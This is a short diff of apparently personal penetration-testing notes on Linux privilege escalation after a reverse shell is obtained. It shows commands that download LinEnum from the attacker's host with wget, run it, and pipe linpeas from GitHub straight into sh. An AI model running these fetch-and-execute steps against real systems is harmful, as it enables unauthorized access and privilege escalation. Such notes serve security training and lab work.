@@ -19,5 +19,5 @@
 4.From the reverse shell, `wget http://$myIP:8080/linEum.sh .` to recieve linEum.sh if we get permission denied  `cd /tmp` \
 5.Give access. `chmod +x linEum.sh` and `./linEum -t` \
 6. If file transfer premission is denied, simply `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` which would execute script.
-
+7.Or manually download the latest linpeas https://github.com/carlospolop/PEASS-ng/releases/tag/20221225
  
